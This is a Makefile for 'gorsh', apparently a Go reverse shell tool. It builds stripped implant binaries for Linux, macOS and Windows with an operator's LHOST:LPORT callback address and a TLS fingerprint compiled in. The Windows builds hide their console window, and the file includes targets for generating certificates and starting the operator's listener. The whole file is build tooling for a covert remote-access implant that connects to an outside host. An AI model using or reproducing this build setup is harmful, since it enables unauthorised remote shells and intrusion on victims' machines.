NAME=gorsh
# please god find a better name

OUT_LINUX=binaries/linux/${NAME}
OUT_MACOS=binaries/macos/${NAME}
OUT_WINDOWS=binaries/windows/${NAME}

SRV_KEY=scripts/server.key
SRV_PEM=scripts/server.pem

BUILD=go build
SRC=cmd/gorsh/main.go

FINGERPRINT=$(shell openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)
STRIP=-s
LINUX_LDFLAGS=--ldflags "${STRIP} -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT}"
WIN_LDFLAGS=--ldflags "${STRIP} -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT} -H windowsgui"

MINGW=x86_64-w64-mingw32-gcc-7.3-posix

all: linux64 windows64 macos64 linux32 macos32 windows32 

depends:
	openssl req -subj '/CN=localhost/O=Localhost/C=US' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
	cat ${SRV_KEY} >> ${SRV_PEM}

listen:
	KEY=${SRV_KEY} PEM=${SRV_PEM} LISTEN=scripts/listen.sh scripts/start.sh

linux64:
	GOOS=linux GOARCH=amd64 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX}64 ${SRC}

windows64:
	CC=${MINGW} \
	CGO_ENABLED=1 GOOS=windows GOARCH=amd64 ${BUILD} ${WIN_LDFLAGS} -o ${OUT_WINDOWS}64.exe ${SRC}

macos64:
	@echo "macOS amd64 currently broken. Fix in progress"
	GOOS=darwin GOARCH=amd64 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_MACOS}64 ${SRC}

linux32:
	GOOS=linux GOARCH=386 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX}32 ${SRC}

windows32:
	GOOS=windows GOARCH=386 ${BUILD} ${WIN_LDFLAGS} -o ${OUT_WINDOWS}32.exe ${SRC}

macos32:
	GOOS=darwin GOARCH=386 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_MACOS}32 ${SRC}

clean:
	rm -rf ${SRV_KEY} ${SRV_PEM} ${OUT_LINUX} ${OUT_WINDOWS} ${OUT_MACOS}

.PHONY: linux64 windows64 macos64 linux32 macos32 windows32 clean listen
